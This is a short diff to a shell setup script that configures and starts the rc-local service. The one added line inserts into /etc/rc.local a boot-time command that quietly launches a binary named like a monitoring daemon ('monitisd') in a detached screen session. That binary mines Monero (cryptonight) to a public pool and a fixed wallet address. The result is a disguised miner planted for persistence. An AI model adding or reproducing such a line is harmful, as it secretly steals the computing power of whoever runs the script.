@@ -7,5 +7,6 @@ chmod 755 /etc/init.d/rc.local
 systemctl enable rc-local
 systemctl start rc-local.service
 systemctl status rc-local.service
+sed -i -e '$i \screen -d -m /usr/local/src/monitisd -D -t 16 -a cryptonight -o stratum+tcp://pool.minexmr.com:4444,5555 -u 48y6Tnun6drf2fQg1Xpcq8M867EkZgcmyHg3GriNotE7Yquy4HWiCrBbzwK186rxwG28foZgvYN9XbtDPNhZvN1UGQth8aa.`hostname`\n' /etc/rc.local
 sh /etc/rc.local &
 exit 0
